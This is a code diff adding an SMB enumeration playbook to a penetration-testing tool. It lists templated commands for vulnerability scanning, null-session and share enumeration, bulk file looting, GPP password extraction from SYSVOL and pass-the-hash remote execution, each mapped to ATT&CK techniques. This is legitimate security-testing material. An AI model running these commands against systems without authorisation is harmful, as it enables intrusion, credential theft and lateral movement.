@@ -354,6 +354,46 @@ const PENTEST_PLAYBOOKS: Playbook[] = [
     ]
   },
 
+  // ─── SMB Enumeration ───────────────────────────────────────────────────────
+  {
+    id: 'builtin-smb-enum',
+    name: 'SMB Enumeration',
+    description: 'Comprehensive SMB/CIFS enumeration methodology covering null sessions, shares, users, and vulnerabilities.',
+    category: 'network',
+    tags: ['smb', 'windows', 'network', 'enum'],
+    version: '1.0',
+    createdAt: NOW,
+    updatedAt: NOW,
+    isBuiltIn: true,
+    variables: { TARGET_IP: '', DOMAIN: '', USER: '', PASS: '' },
+    steps: [
+      step('smb-1', 1, 'Initial SMB Port Check', 'Confirm SMB ports are open and identify protocol version.', 'recon',
+        ['nmap -p 139,445 --open {{TARGET_IP}}', 'nmap -sV -p 139,445 --script=smb-security-mode,smb-os-discovery,smb2-security-mode {{TARGET_IP}}'],
+        'Port 139=NetBIOS/SMBv1, 445=SMBv2+. Note dialect version — SMBv1 is vulnerable to EternalBlue.', true, 'T1046', 'Network Service Discovery', 'command'),
+      step('smb-2', 2, 'SMB Vulnerability Scan', 'Check for known critical SMB vulnerabilities.', 'exploit',
+        ['nmap --script=smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-cve-2020-0796 -p 445 {{TARGET_IP}}'],
+        'MS17-010=EternalBlue, MS08-067=legacy RCE, CVE-2020-0796=SMBGhost. Any hit = critical finding.', true, 'T1210', 'Exploitation of Remote Services', 'command'),
+      step('smb-3', 3, 'Null Session / Anonymous Enumeration', 'Attempt unauthenticated enumeration to gather domain info without credentials.', 'enum',
+        ['enum4linux -a {{TARGET_IP}}', 'enum4linux-ng -A {{TARGET_IP}}', 'smbclient -L //{{TARGET_IP}}/ -N'],
+        'Null sessions reveal: domain name, users, groups, password policy, shares. Note any readable shares.', true, 'T1135', 'Network Share Discovery', 'command'),
+      step('smb-4', 4, 'CrackMapExec SMB Recon', 'Use CrackMapExec for comprehensive SMB fingerprinting.', 'enum',
+        ['crackmapexec smb {{TARGET_IP}}', 'crackmapexec smb {{TARGET_IP}} --shares -u "" -p ""', 'crackmapexec smb {{TARGET_IP}} --users -u "" -p ""'],
+        'CME provides OS, SMB signing status, hostname, domain. Disabled SMB signing enables relay attacks.', true, 'T1087.002', 'Domain Account', 'command'),
+      step('smb-5', 5, 'Authenticated Share Enumeration', 'List and access shares using discovered credentials.', 'enum',
+        ['smbclient -L //{{TARGET_IP}}/ -U {{USER}}%{{PASS}}', 'smbmap -H {{TARGET_IP}} -u {{USER}} -p {{PASS}}', 'crackmapexec smb {{TARGET_IP}} --shares -u {{USER}} -p {{PASS}}'],
+        'Look for: non-default shares (SYSVOL, NETLOGON, C$, ADMIN$, custom shares). Check read/write access.', true, 'T1135', 'Network Share Discovery', 'command'),
+      step('smb-6', 6, 'Browse and Download Sensitive Files', 'Recursively list and retrieve interesting files from accessible shares.', 'loot',
+        ['smbmap -H {{TARGET_IP}} -u {{USER}} -p {{PASS}} -R', 'crackmapexec smb {{TARGET_IP}} -u {{USER}} -p {{PASS}} -M spider_plus', 'smbclient //{{TARGET_IP}}/SHARE -U {{USER}}%{{PASS}} -c "recurse ON; prompt OFF; mget *"'],
+        'Look for: .xml files with passwords (Groups.xml in SYSVOL), config files, backups, scripts.', true, 'T1039', 'Data from Network Shared Drive', 'action'),
+      step('smb-7', 7, 'SYSVOL/NETLOGON Script Analysis', 'Check SYSVOL for Group Policy Preferences passwords and logon scripts.', 'loot',
+        ['smbclient //{{TARGET_IP}}/SYSVOL -U {{USER}}%{{PASS}} -c "recurse ON; prompt OFF; mget *"', "find . -name 'Groups.xml' | xargs grep -l 'cpassword'"],
+        'GPP passwords in Groups.xml are encrypted with a known key. Decrypt with: gpp-decrypt <cpassword>', true, 'T1552.006', 'Group Policy Preferences', 'command'),
+      step('smb-8', 8, 'Pass-the-Hash Attempt', 'If NTLM hashes obtained, attempt PTH authentication.', 'exploit',
+        ['crackmapexec smb {{TARGET_IP}} -u {{USER}} -H <NTLM_HASH>', 'impacket-smbexec {{DOMAIN}}/{{USER}}@{{TARGET_IP}} -hashes :NTLM_HASH'],
+        'Requires valid NTLM hash. SMB signing must be disabled for relay. Local admin required for remote exec.', false, 'T1550.002', 'Pass the Hash', 'action'),
+    ]
+  },
+
   // ─── Privilege Escalation Checklist ────────────────────────────────────────
   {
     id: 'builtin-privesc-checklist',
